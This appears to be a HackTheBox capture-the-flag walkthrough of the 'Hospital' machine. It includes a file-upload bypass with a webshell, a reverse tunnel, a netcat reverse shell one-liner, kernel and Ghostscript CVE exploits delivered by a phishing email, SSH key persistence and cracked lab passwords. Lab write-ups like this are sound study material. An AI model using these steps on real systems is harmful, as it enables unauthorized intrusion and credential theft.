---
date: 2025-04-15
categories: [CTF, HTB]
title: "HTB - Hospital"
tags: ['hashcat', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'smb', 'windows']

description: "Hospital - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Hospital

NMAP

![image1](../resources/02bd7caac4a34c9e957e4294983ed8b5.png)


![image2](../resources/6121b80d5d134ae9ad68dd93dc82e310.png)

Add hospital.htb to /etc/hosts

```bash
dirsearch -u <https://hospital.htb>

```

![image3](../resources/97071f6b2a35431991fb05a0b506da95.png)

```bash
dirsearch -u <http://hospital.htb:8080>

```

![image4](../resources/ac431ae2bae84035a511fab12d2bd90d.png)

- We need to bypass the file upload filter, as it only allows image files to be uploaded

- Uploading a .php file gives an error:

![image5](../resources/141cade407a44431a871dc9fe6b8eb39.png)


![image6](../resources/be4ae7daf4164074bcd73b5609f68179.png)

- Changing the extension to **.pht** - we seem to get success:

![image7](../resources/67732ed426a244a5a2f539c8080ed485.png)

But the shell isn't interactive


![image8](../resources/b572204a203c444dac1fb86bb11b6ebe.png)

<u>Using **.phar**:</u>


![image9](../resources/52548ac24972467caf8dbae1b7ed3ae2.png)


![image10](../resources/36e7f4ca90394d85b48d36c40e3d2c88.png)


![image11](../resources/d0c8d930fb954b67a1213ab02f306b13.png)

- Go to:
/uploads/image.phar


![image12](../resources/4c7574c620ae4610bba403db741aefb9.png)

I used this webshell:

<https://github.com/incredibleindishell/Mannu-Shell/blob/master/mannu.php>

or this one:

<https://github.com/flozz/p0wny-shell/blob/master/shell.php>

- We can see it's a Linux webserver running

![image13](../resources/d3dd1cf04c9d4a778901ea807be50ef3.png)

- We can see it's a Linux webserver running

![image13](../resources/d3dd1cf04c9d4a778901ea807be50ef3.png)

Switched to p0wnyshell for better enumeration

<https://github.com/flozz/p0wny-shell/blob/master/shell.php>


![image14](../resources/7b51cd31c8894994a14bdaf0bbb5b88b.png)

MySQL creds in config.php:

**root : my\$qls3rv1c3!**


![image15](../resources/5880422b66484940b7ae0fc0743a0f5d.png)

- It connects to the mysql but no output:

![image16](../resources/e2c9710c490c434b96c1e1e51fa5e7c9.png)

- Upload chisel to the webserver

- On Kali:
```bash
./chisel server -p 8888 --reverse

```
- On target:
```bash
./chisel client 10.10.14.31:8888 R:socks

```
- Now run mysql command through proxychains

![image17](../resources/13d9cd2ba34a43878dd8b37e36440335.png)

**<u>Bcrypt passwords:</u>**

**Admin : 123456**

but it doesn't give us anymore access

**<u>Priv Esc -- CVE-2023-2640/CVE-2023-32629</u>**

- The kernel version is vulnerable:

![image18](../resources/749a8319d6f34c26b1ec8de7e18211f7.png)


![image19](../resources/2d93d3afbbba48328b12d964f6927901.png)

<https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629>

<https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a>


![image20](../resources/68accd0f44cb4188a22b05e9cb504fab.png)

- Send the shell to Kali:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2\>&1\|nc 10.10.14.31 9000 \>/tmp/f

```
- Upload the exploit.sh to the webserver
```bash
chmod +x exploit.sh

```
- And run

- And we are root on the webserver:

![image21](../resources/907b47f33c1046f4ab74e13d0a2260aa.png)

**<u>Get SSH access and some persistence:</u>**
```bash
ssh-keygen -t rsa -b 4096
chmod 600 id_rsa
cat id_rsa.pub
echo "\<id_rsa.pub\>" \>\> authorized_keys

ssh root@hospital.htb -i id_rsa
```

![image22](../resources/ed8443863e92463dbc6697c521be35e7.png)


![image23](../resources/8b4d7167b45d4ca3a26ba2900d9b375d.png)

```bash
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

![image24](../resources/9378609249f14eb6ab6c813f8c7677e2.png)

**drwilliams : qwe123!@#**

```bash
crackmapexec smb hospital.htb -u drwilliams -p 'qwe123!@#'

```

![image25](../resources/38a4d92c6494499ea8f05cdd89dda9ba.png)

We have Windows credentials

- Logging into the webmail server with the credentials:
<https://hospital.htb>


![image26](../resources/5995780827bd4e568e7b32457ecfc5ee.png)


![image27](../resources/4715ad42f7624e1199b8ca5dfbc74267.png)

- As we can see from the email:

![image27](../resources/4715ad42f7624e1199b8ca5dfbc74267.png)

He wants a .eps file that will be processed by GhostScript

- There is a recent CVE for GhostScript:
<https://vsociety.medium.com/cve-2023-36664-command-injection-with-ghostscript-poc-exploit-97c1badce0af>

<https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>

```bash
git clone <https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>

cd CVE-2023-36664-Ghostscript-command-injection

python3 CVE_2023_36664_exploit.py --generate --payload '\<powershell base64 payload\>' --filename new_design --extension eps

```

![image28](../resources/f85608ef86e444d5b6385e4532a848d8.png)

- Now we need to reply to his email with the attachment:

![image29](../resources/79adda5f4def48208913724204827fcf.png)

- Set up a listener:

![image30](../resources/fe3522cb5d474818b36a0c8762592db3.png)

We are user **drbrown**

- After gaining access with the phishing email:
```bash
cat user.txt

```
- Plaintext credentials in Documents/ghostscript.bat:

![image31](../resources/8ae503ebe1df46989886356724c38d62.png)

**hospital\drbrown : chr!\$br0wn**

- RDP in:
```bash
xfreerdp /u:drbrown /p:'chr!\$br0wn' /cert:ignore /v:hospital.htb /dynamic-resolution +clipboard

```

![image32](../resources/c46d4644c62f4a359af2e609711a7410.png)


![image33](../resources/bd93a4ddec6741159e9447c3d49d413e.png)

- So basically, any .php file in the htdocs will be served up


![image34](../resources/a4949fe832f84fb7af21772a31096a34.png)

- The index.php is for the https Roundmail site

![image35](../resources/a9a2990a321e4b328d01ad44c00c02ce.png)

- We have write access:

![image36](../resources/c389e90c520b4849a417e08fbf68f158.png)

- We can test this with:

![image37](../resources/a4ebc125cec242d6821495cf76db9536.png)


![image38](../resources/c5c7a00ec573468baa49c8ebede1061d.png)

- Now we'll upload the same webshell as before:
<https://github.com/flozz/p0wny-shell/blob/master/shell.php>


![image39](../resources/44bf41a484ff4fa0b470e4d383a78dea.png)

- We are SYSTEM:

![image40](../resources/15c4515edef144269dbb230b2079e653.png)

```bash
type root.txt

```